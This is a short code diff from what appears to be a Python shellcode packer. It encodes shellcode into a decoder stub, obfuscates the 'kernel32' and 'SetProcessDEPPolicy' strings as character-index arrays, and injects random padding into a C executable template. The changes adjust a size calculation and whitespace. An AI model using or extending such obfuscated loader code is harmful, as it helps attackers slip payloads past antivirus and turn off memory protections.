@@ -190,7 +190,7 @@ if __name__ == "__main__":
 	final = ASM_DECODER.replace("[OPCODE]", encoded_shellcode)
 	final = final.replace("[MAGIC]", helper.to_hex(magic))
 	
-	shellcode_size = len(encoded_shellcode) / 4
+	shellcode_size = (len(encoded_shellcode) / 4) - 4
 	number_of_chunk = helper.to_hex(struct.pack("<i", shellcode_size / 4))
 	shellcode_size = helper.to_hex(struct.pack("<i", shellcode_size))
 	
@@ -216,7 +216,7 @@ if __name__ == "__main__":
 
 	helper.print_info("Generating random charset array for kernel32 and SetProcessDEPPolicy")
 	helper.print_info("Generating int array for \"%s\". Array size is: %d" % (kernel32_string, len(kernel32_string)))
-    
+	
 	c_code_output = "DWORD %s[] = {" % kernel32_var
 	for i in range(0, len(kernel32_string)):
 		for j in range(0, len(char_charset)):
@@ -238,7 +238,7 @@ if __name__ == "__main__":
 	c_code_output = c_code_output[:-2] + "};\n\tCHAR *" + kernel32_c_var + " = NULL;\n\tCHAR *" + SetProcessDEPPolicy_c_var + " = NULL;\n\t"
 	c_code_output += func_name + "(" + kernel32_var + ", " + str(len(kernel32_string)) + ", &" + kernel32_c_var + ");\n\t"
 	c_code_output += func_name + "(" + SetProcessDEPPolicy_var + ", " + str(len(SetProcessDEPPolicy_string)) + ", &" + SetProcessDEPPolicy_c_var + ");\n\t"
-      
+	  
 	exe = exe.replace("[SHELLCODE]", final) \
 	.replace("[RAND]", helper.generate_random(random.randrange(10, 10000))) \
 	.replace("[FUNC_ARRAY]", c_code_output) \
